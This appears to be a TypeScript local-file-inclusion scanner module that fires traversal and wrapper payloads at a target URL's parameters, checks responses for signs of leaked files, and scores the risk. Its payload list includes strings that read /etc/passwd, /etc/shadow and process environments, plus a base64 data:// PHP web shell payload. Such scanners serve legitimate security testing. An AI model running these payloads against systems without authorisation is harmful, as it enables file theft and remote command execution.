import axios from 'axios';

export interface LfiScannerOptions {
  url: string;
  paramName?: string;
  customPayloads?: string[];
  deepScan?: boolean;
  timeout?: number;
  userAgent?: string;
  scanCommonLocations?: boolean;
}

export interface LfiScanResult {
  url: string;
  scanTime: number;
  vulnerable: boolean;
  paramsTested: string[];
  vulnerableParams: string[];
  successfulPayloads: Array<{
    param: string;
    payload: string;
    response: {
      status: number;
      contentLength: number;
      contentPreview?: string;
      indicators?: string[];
    };
  }>;
  testedPayloads: number;
  testedEndpoints: number;
  totalRequests: number;
  scanSummary: {
    riskLevel: 'Safe' | 'Low Risk' | 'Medium Risk' | 'High Risk' | 'Critical';
    score: number; // 0-100
    description: string;
  };
  recommendations: string[];
}

// Common LFI payloads
const defaultPayloads = [
  '../../../../../../../etc/passwd',
  '..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
  '....//....//....//....//....//....//etc/passwd',
  '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd',
  '../../../../../../../../../../../../../etc/passwd%00',
  '../../../../../../../../../../etc/passwd&',
  '....//....//....//....//....//....//....//....//etc/passwd',
  '../../../../../../../../../../../etc/passwd%00',
  '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
  'php://filter/convert.base64-encode/resource=/etc/passwd',
  'php://filter/convert.base64-encode/resource=../../../../../etc/passwd',
  'php://filter/read=convert.base64-encode/resource=/etc/passwd',
  'file:///etc/passwd',
  'expect://ls',
  'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=',
  '/proc/self/environ',
  '/proc/self/cmdline',
  '/proc/self/fd/0',
  '/proc/self/fd/1',
  '/proc/self/fd/2'
];

// Common files to look for in LFI vulnerabilities
const sensitiveFiles = [
  '/etc/passwd',
  '/etc/shadow',
  '/etc/hosts',
  '/etc/hostname',
  '/etc/issue',
  '/etc/apache2/apache2.conf',
  '/etc/httpd/conf/httpd.conf',
  '/proc/self/environ',
  '/proc/self/cmdline',
  '/proc/version',
  '/etc/mysql/my.cnf',
  '/var/log/apache/access.log',
  '/var/log/apache2/access.log',
  '/var/log/nginx/access.log',
  '/var/log/httpd/access_log',
  'C:\\Windows\\win.ini',
  'C:\\boot.ini',
  'C:\\Windows\\System32\\drivers\\etc\\hosts'
];

// Indicators of successful LFI
const lfiIndicators = [
  'root:x:0:0:',              // /etc/passwd content
  '[boot loader]',            // boot.ini content
  '# If you change this file',   // hosts file comment
  'for 16-bit app support',   // win.ini content
  'LFI vulnerability confirmed', // Special check string
  'www-data:x:',              // Apache user in /etc/passwd
  'mysql:',                   // MySQL user in /etc/passwd
  'DB_PASSWORD',              // Environment variable with password
  'HTTP_USER_AGENT',          // Environment variable
  'PATH=',                    // Common in /proc/self/environ
  'DOCUMENT_ROOT=',           // Common in /proc/self/environ
  'Linux version',            // /proc/version content
  'processor',                // /proc/cpuinfo content
  'memory',                   // /proc/meminfo content
  'AuthUserFile',             // Apache config
  'server {',                 // Nginx config
  '<Directory ',              // Apache config
  'password',                 // Generic password indicator
  'user:',                    // User entry
  'admin:',                   // Admin entry
  '<svg',                      // SVG file detection
  '<script',                  // JavaScript detection
  '<?php',                   // PHP code detection
  '<?xml',                    // XML detection
  'private key',              // Private key detection
  'ssh-rsa'                   // SSH key detection
];

/**
 * Scan URL for Local File Inclusion vulnerabilities
 * @param options LFI scanner options
 * @returns LFI scan results
 */
export async function scanForLfi(options: LfiScannerOptions): Promise<LfiScanResult> {
  const { 
    url, 
    paramName, 
    customPayloads = [],
    deepScan = false,
    timeout = 10000,
    userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    scanCommonLocations = true
  } = options;
  
  // Start timing
  const startTime = Date.now();
  
  // Prepare result object
  const result: LfiScanResult = {
    url,
    scanTime: 0, // Updated at the end
    vulnerable: false,
    paramsTested: [],
    vulnerableParams: [],
    successfulPayloads: [],
    testedPayloads: 0,
    testedEndpoints: 0,
    totalRequests: 0,
    scanSummary: {
      riskLevel: 'Safe',
      score: 0,
      description: 'No LFI vulnerabilities detected'
    },
    recommendations: [
      'Always validate and sanitize user input',
      'Implement proper input filtering for file paths',
      'Use allowlists instead of denylists for file paths',
      'Configure web server to prevent directory traversal',
      'Implement proper file access controls'
    ]
  };
  
  try {
    // Normalize URL
    const targetUrl = new URL(url);
    
    // Combine default and custom payloads
    const payloads = [...defaultPayloads, ...customPayloads];
    
    // Determine parameters to test
    let paramsToTest: string[] = [];
    
    if (paramName) {
      // Use specified parameter
      paramsToTest = [paramName];
    } else {
      // Extract parameters from URL
      const urlParams = Array.from(targetUrl.searchParams.keys());
      
      // Add some common parameter names if none found or deep scan is enabled
      if (urlParams.length === 0 || deepScan) {
        const commonParams = ['file', 'path', 'dir', 'filepath', 'page', 'filename', 'doc', 'document', 'include', 'inc', 'require', 'view', 'content', 'template', 'lang', 'download', 'show', 'site', 'cat', 'id', 'image'];
        paramsToTest = [...urlParams, ...commonParams];
      } else {
        paramsToTest = urlParams;
      }
    }
    
    // Remove duplicates
    paramsToTest = [...new Set(paramsToTest)];
    result.paramsTested = paramsToTest;
    
    // Prepare test URLs
    const testUrls: Array<{ param: string, payload: string, url: string }> = [];
    
    for (const param of paramsToTest) {
      for (const payload of payloads) {
        const testUrl = new URL(targetUrl.toString());
        testUrl.searchParams.set(param, payload);
        testUrls.push({
          param,
          payload,
          url: testUrl.toString()
        });
      }
    }
    
    // Add scan for common vulnerable locations if enabled
    if (scanCommonLocations && deepScan) {
      // Check common endpoint patterns
      const endpoints = ['/index.php', '/page.php', '/main.php', '/view.php', '/home.php', '/default.php'];
      
      for (const endpoint of endpoints) {
        const endpointUrl = new URL(targetUrl.origin + endpoint);
        
        for (const param of paramsToTest) {
          for (const payload of payloads.slice(0, 5)) { // Use fewer payloads for endpoint scanning
            endpointUrl.searchParams.set(param, payload);
            testUrls.push({
              param,
              payload,
              url: endpointUrl.toString()
            });
          }
        }
      }
    }
    
    // Set total counts for progress tracking
    result.testedPayloads = payloads.length;
    result.testedEndpoints = scanCommonLocations && deepScan ? 6 : 1; // 6 common endpoints or just the target URL
    
    // Test each URL for LFI vulnerability
    for (const test of testUrls) {
      try {
        // Increment request counter
        result.totalRequests++;
        
        // Make the request
        const response = await axios.get(test.url, {
          timeout,
          maxRedirects: 2,
          validateStatus: () => true, // Allow any status code
          headers: {
            'User-Agent': userAgent
          }
        });
        
        // Prepare response data for analysis
        const responseData = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        const contentPreview = responseData.substring(0, 200).replace(/\n/g, ' ').trim();
        
        // Check for LFI indicators
        const foundIndicators = lfiIndicators.filter(indicator => 
          responseData.includes(indicator)
        );
        
        // Consider it vulnerable if indicators are found and response is not an error
        if (
          foundIndicators.length > 0 && 
          response.status >= 200 && 
          response.status < 500
        ) {
          // Mark as vulnerable
          result.vulnerable = true;
          
          // Add to vulnerable parameters if not already there
          if (!result.vulnerableParams.includes(test.param)) {
            result.vulnerableParams.push(test.param);
          }
          
          // Add to successful payloads
          result.successfulPayloads.push({
            param: test.param,
            payload: test.payload,
            response: {
              status: response.status,
              contentLength: responseData.length,
              contentPreview,
              indicators: foundIndicators
            }
          });
        }
      } catch (error) {
        // Ignore connection errors for individual tests
        continue;
      }
    }
    
    // Calculate risk score and level
    const vulnerabilityScore = calculateRiskScore(result);
    result.scanSummary.score = vulnerabilityScore;
    
    // Set risk level based on score
    if (vulnerabilityScore >= 80) {
      result.scanSummary.riskLevel = 'Critical';
      result.scanSummary.description = 'Critical LFI vulnerabilities detected with high confidence';
    } else if (vulnerabilityScore >= 60) {
      result.scanSummary.riskLevel = 'High Risk';
      result.scanSummary.description = 'High risk LFI vulnerabilities detected';
    } else if (vulnerabilityScore >= 40) {
      result.scanSummary.riskLevel = 'Medium Risk';
      result.scanSummary.description = 'Potential LFI vulnerabilities detected';
    } else if (vulnerabilityScore >= 20) {
      result.scanSummary.riskLevel = 'Low Risk';
      result.scanSummary.description = 'Low confidence indicators of potential LFI vulnerabilities';
    } else {
      result.scanSummary.riskLevel = 'Safe';
      result.scanSummary.description = 'No LFI vulnerabilities detected';
    }
    
    // Add specific recommendations based on findings
    if (result.vulnerable) {
      result.recommendations.push('Fix the vulnerable parameters: ' + result.vulnerableParams.join(', '));
      result.recommendations.push('Implement a Web Application Firewall (WAF) to filter malicious requests');
    }
    
  } catch (error: any) {
    // Handle overall errors
    console.error('LFI scanning error:', error.message);
  }
  
  // Update scan time
  result.scanTime = Date.now() - startTime;
  
  return result;
}

/**
 * Calculate risk score based on scan results
 * @param result LFI scan result
 * @returns Risk score (0-100)
 */
function calculateRiskScore(result: LfiScanResult): number {
  if (!result.vulnerable) {
    return 0;
  }
  
  let score = 0;
  
  // Points for each vulnerable parameter
  score += result.vulnerableParams.length * 20;
  
  // Points for each successful payload
  for (const payload of result.successfulPayloads) {
    // Higher scores for more critical files
    if (payload.payload.includes('/etc/passwd') || 
        payload.payload.includes('/etc/shadow') ||
        payload.payload.includes('win.ini')) {
      score += 15;
    } else {
      score += 10;
    }
    
    // Points for each indicator found
    score += Math.min(payload.response.indicators?.length || 0, 5) * 5;
    
    // Points for successful status code
    if (payload.response.status >= 200 && payload.response.status < 300) {
      score += 10;
    }
  }
  
  // Cap at 100
  return Math.min(score, 100);
}